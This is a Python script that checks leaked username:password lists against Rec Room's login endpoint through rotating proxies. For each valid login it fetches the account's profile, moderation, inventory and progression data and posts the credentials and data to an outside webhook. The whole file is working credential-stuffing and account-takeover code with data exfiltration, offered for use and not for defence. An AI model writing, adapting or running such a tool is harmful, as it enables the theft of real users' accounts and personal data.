import requests
from urllib.parse import quote_plus
import re
from colorama import Fore, Style, init
import random
import io
import json

init(autoreset=True)

url = "https://auth.rec.net/connect/token"

headers = {
    "Content-Type": "application/x-www-form-urlencoded",
    "User-Agent": "UnityPlayer/2025.7.3f1 (UnityWebRequest/1.0, libcurl/7.84.0-DEV)",
    "X-Unity-Version": "2025.7.3f1",
    "Accept-Encoding": "gzip, deflate",
}

with open("info.txt", "r") as f:
    RawDataTemplate = f.read().strip()

with open("webhook.txt", "r") as f:
    WebHookURL = f.read().strip()

with open("proxies.txt", "r") as f:
    ProxyList = []
    for line in f:
        line = line.strip()
        if not line:
            continue
        ip, port, user, pwd = line.split(":")
        ProxyAuth = f"{user}:{pwd}@{ip}:{port}"
        ProxyList.append({
            "http": f"http://{ProxyAuth}",
            "https": f"http://{ProxyAuth}"
        })

def ReplaceParam(RawData, param, value):
    EncodedVal = quote_plus(value)
    pattern = re.compile(rf"({param}=)[^&]*")
    return pattern.sub(lambda m: m.group(1) + EncodedVal, RawData)

def SendWebhook(username, password, MeData, AvatarData, BlockData, EquipData, ProgressionData):
    try:
        Payload = {
            "content": f"@everyone\n**Hit:** `{username}:{password}`"
        }
        requests.post(WebHookURL, json=Payload)

        MeJson = json.dumps(MeData, indent=2)[:1900]
        requests.post(WebHookURL, json={
            "content": f"**/account/me:**\n```json\n{MeJson}\n```"
        })

        BlockJson = json.dumps(BlockData, indent=2)[:1900]
        requests.post(WebHookURL, json={
            "content": f"**/moderationBlockDetails:**\n```json\n{BlockJson}\n```"
        })

        ProgJson = json.dumps(ProgressionData, indent=2)[:1900]
        requests.post(WebHookURL, json={
            "content": f"**/progression/bulk:**\n```json\n{ProgJson}\n```"
        })

        AvatarTxt = io.BytesIO(json.dumps(AvatarData, indent=2).encode('utf-8'))
        requests.post(WebHookURL, data={"content": "**/avatar/v4/items:**"}, files={
            'file': ('Clothing.txt', AvatarTxt)
        })

        EquipTxt = io.BytesIO(json.dumps(EquipData, indent=2).encode('utf-8'))
        requests.post(WebHookURL, data={"content": "**/getUnlocked:**"}, files={
            'file': ('Skins.txt', EquipTxt)
        })

    except Exception as e:
        print(f"{Fore.YELLOW}Failed to send webhook: {e}{Style.RESET_ALL}")

with open("logs.txt", "r") as f, open("hits.txt", "a") as hit_file:
    for line in f:
        line = line.strip()
        if not line or ":" not in line:
            continue

        username, password = line.split(":", 1)
        DataToSend = ReplaceParam(RawDataTemplate, "username", username)
        DataToSend = ReplaceParam(DataToSend, "password", password)
        proxy = random.choice(ProxyList)

        try:
            response = requests.post(url, headers=headers, data=DataToSend, proxies=proxy, timeout=10)
            ResponseJson = response.json()
        except Exception:
            print(f"{Fore.RED}Not A Hit: {username}:{password} | Status code: Error or Timeout{Style.RESET_ALL}")
            continue

        if response.status_code == 200 and "access_token" in ResponseJson:
            access_token = ResponseJson["access_token"]
            AuthHeader = {
                "Authorization": f"Bearer {access_token}",
                "User-Agent": headers["User-Agent"]
            }

            try:
                MeResp = requests.get("https://accounts.rec.net/account/me", headers=AuthHeader, proxies=proxy, timeout=10)
                AvatarResp = requests.get("https://econ.rec.net/api/avatar/v4/items", headers=AuthHeader, proxies=proxy, timeout=10)

                MeData = MeResp.json() if MeResp.status_code == 200 else {}
                AvatarData = AvatarResp.json() if AvatarResp.status_code == 200 else {}

                AccountID = MeData.get("accountId")
                if not AccountID:
                    raise Exception("Missing accountId in /account/me")

                BlockResp = requests.get("https://api.rec.net/api/PlayerReporting/v1/moderationBlockDetails", headers=AuthHeader, proxies=proxy, timeout=10)
                EquipResp = requests.get("https://econ.rec.net/api/equipment/v2/getUnlocked", headers=AuthHeader, proxies=proxy, timeout=10)
                ProgResp = requests.get(f"https://api.rec.net/api/players/v2/progression/bulk?id={AccountID}", headers=AuthHeader, proxies=proxy, timeout=10)

                BlockData = BlockResp.json() if BlockResp.status_code == 200 else {}
                EquipData = EquipResp.json() if EquipResp.status_code == 200 else {}
                ProgessionData = ProgResp.json() if ProgResp.status_code == 200 else {}

                print(f"{Fore.GREEN}Hit: {username}:{password} | Status code: 200{Style.RESET_ALL}")
                hit_file.write(f"{username}:{password}\n")
                hit_file.flush()

                SendWebhook(username, password, MeData, AvatarData, BlockData, EquipData, ProgessionData)

            except Exception as e:
                print(f"{Fore.YELLOW}Hit but failed to get extra data: {e}{Style.RESET_ALL}")
        else:
            print(f"{Fore.RED}Not A Hit: {username}:{password} | Status code: {response.status_code}{Style.RESET_ALL}")
